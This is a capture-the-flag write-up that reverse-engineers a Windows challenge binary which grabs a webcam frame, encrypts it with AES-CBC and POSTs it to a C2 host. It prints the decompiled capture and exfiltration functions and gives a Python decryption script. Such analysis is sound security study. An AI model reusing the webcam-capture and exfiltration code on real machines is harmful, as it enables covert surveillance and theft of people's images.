---
author: "nothoudaifa"
title: "Stealerusk chall from Alpacahack B-Side writeup"
date: "2026-06-28"
tags: 
- ctf 
- rev
- windows
---

this was a B-Side challenge released on Alpacahack, you can check it out [here](https://alpacahack.com/daily-bside/challenges/stealerusk?month=2026-03), it's difficulty is Very Hard 7.0 .


## TL;DR
reversing a windows malware that takes an image from the webcam and sends it to a C2 server.

## Solve
we are given two files `chal.exe` and `packet.pcap`, i started by checking the pcap, it only contains a single POST request with some binary data as you can see here:
![wireshark screenshot](/alpaca-bside-stealerusk/2026-06-28|13:27:16.166.png)

now opening the executable in ida we get this decompilation of the main function:
![ida main function screenshot](/alpaca-bside-stealerusk/2026-06-28|13:29:35.298.png)


the first part gets the current directory path and compares it to another path using it's rfid (rfid is a folder identifier in windows, you can check [docs](https://learn.microsoft.com/en-us/windows/win32/api/shlobj_core/nf-shlobj_core-shgetknownfolderpath) of the function to know more about it) if the comparision succeeds then it will execute the malware code.

the malware calls 2 functions `sub_140001640` and `sub_1400017B0`.

#### sub_140001640:
```c
__int64 sub_140001640()
{
  HWND hWnd; // [rsp+40h] [rbp-28h]
  int v2; // [rsp+48h] [rbp-20h]

  hWnd = capCreateCaptureWindowW(L"capture", 0, 0, 0, 640, 480, 0, 0);
  if ( !hWnd )
    return 1;
  if ( IsWindow(hWnd) )
    v2 = SendMessageW(hWnd, 0x40Au, 0, 0);
  else
    v2 = 0;
  if ( !v2 )
    return 1;
  Sleep(0x3E8u);
  SendMessageW(hWnd, 0x405u, 0, (LPARAM)handler);
  byte_140005114 = 0;
  if ( SendMessageW(hWnd, 0x43Du, 0, 0) )
  {
    Sleep(0x1F4u);
    if ( IsWindow(hWnd) )
      SendMessageW(hWnd, 0x40Bu, 0, 0);
    return 0;
  }
  else
  {
    if ( IsWindow(hWnd) )
      SendMessageW(hWnd, 0x40Bu, 0, 0);
    return 1;
  }
}
```
i haven't fully reversed this function, but based on the documentation of [capCreateCaptureWindowW](https://learn.microsoft.com/en-us/windows/win32/api/vfw/nf-vfw-capcreatecapturewindoww), it creates a capture window which can be used to capture some data, it seems to configure it using SendMessageW one important thing is that it's setting some kind of handler function `handler`, we will get to that later.


#### sub_1400017B0:
```c
__int64 __fastcall sub_1400017B0(const void *a1, DWORD a2)
{
  void *hRequest; // [rsp+40h] [rbp-38h]
  unsigned int v4; // [rsp+48h] [rbp-30h]
  void *hConnect; // [rsp+50h] [rbp-28h]
  void *hSession; // [rsp+58h] [rbp-20h]
  DWORD dwNumberOfBytesWritten; // [rsp+60h] [rbp-18h] BYREF

  v4 = 0;
  hConnect = 0;
  hRequest = 0;
  hSession = WinHttpOpen(
               L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
               0,
               0,
               0,
               0);
  if ( hSession )
  {
    hConnect = WinHttpConnect(hSession, L"meccha-ayashii-server.internal", 0x50u, 0);
    if ( hConnect )
    {
      hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/waiwai", 0, 0, 0, 0);
      if ( hRequest )
      {
        if ( WinHttpSendRequest(hRequest, L"Content-Type: application/octet-stream\r\n", 0xFFFFFFFF, 0, 0, a2, 0) )
        {
          dwNumberOfBytesWritten = 0;
          if ( WinHttpWriteData(hRequest, a1, a2, &dwNumberOfBytesWritten) )
          {
            if ( dwNumberOfBytesWritten == a2 )
              v4 = WinHttpReceiveResponse(hRequest, 0);
          }
        }
      }
    }
  }
  if ( hRequest )
    WinHttpCloseHandle(hRequest);
  if ( hConnect )
    WinHttpCloseHandle(hConnect);
  if ( hSession )
    WinHttpCloseHandle(hSession);
  return v4;
}
```
this function takes 2 global variables which are data buffer and size (which are used in the handler function too) and sends an http post request as we've seen in the pcap.

#### handler function:

following the code of the handler function we reach `sub_140001100` which is called like this:
```c
sub_140001100(a1, a2, (unsigned int)&unk_140005078, (unsigned int)&data_sent, (__int64)&data_sent_size);
```
you can check the function decompilation [here](/alpaca-bside-stealerusk/sub_140001100_decomp.c)

i guessed that a1 and a2 are data pointer and data size from their signature `UCHAR *a1, ULONG a2`, this function generates a random 0x10 value and uses it as iv and uses the third argument as key then it encrypts the capture data using aes-cbc, and then it puts the result in data_sent with the iv as the first 16 bytes.

#### decryption:
knowing this i made the following decryption function in python:
```py
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad


with open('./enc', 'rb') as f:
    data = f.read()
iv = data[:0x10] # iv is the first 0x10 bytes
data = data[0x10:] # rest is encrypted data


key = bytes.fromhex('9Dh, E7h, 5Ch, 29h, B5h, 07, 38h, 71h, 0Dh, 83h, 49h,39h, 73h, FDh, EBh, 9Ch'.replace(',','').replace('h','').replace(' ','')) # the key extracted from ida
print(key.hex())

cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = unpad(cipher.decrypt(data), AES.block_size)

open('dec', 'wb').write(plaintext)
```

running file on dec we see that it is an image:
```bash
$ file dec
dec: JPEG image data, baseline, precision 8, 1280x720, components 3
```

viewing it gives us the flag:
![flag image](/alpaca-bside-stealerusk/dec.jpeg)

